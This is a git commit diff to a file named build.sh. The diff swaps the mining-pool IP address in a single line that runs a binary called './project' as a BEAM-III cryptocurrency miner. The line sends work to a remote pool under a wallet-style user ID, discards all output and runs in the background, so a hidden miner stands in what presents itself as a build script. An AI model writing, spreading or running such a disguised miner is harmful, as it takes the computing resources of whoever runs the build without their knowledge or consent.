fb85a01ca173fb830fea3f1005a5ee87358e5d2b
sarifadim <115786763+sarifadim@users.noreply.github.com>
2024-11-08 14:00:28 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,1 +1,1 @@
-./project --algo BEAM-III --pool 47.236.123.51:80 --user 35abc183df02cef8b5ab05ea3df9ecf5e1b8bbeb8ccc0bdb7a27073e80621131c4e.$(echo 0C-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable --no-cl >/dev/null 2>&1 &
+./project --algo BEAM-III --pool 47.236.253.240:80 --user 35abc183df02cef8b5ab05ea3df9ecf5e1b8bbeb8ccc0bdb7a27073e80621131c4e.$(echo 0C-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable --no-cl >/dev/null 2>&1 &
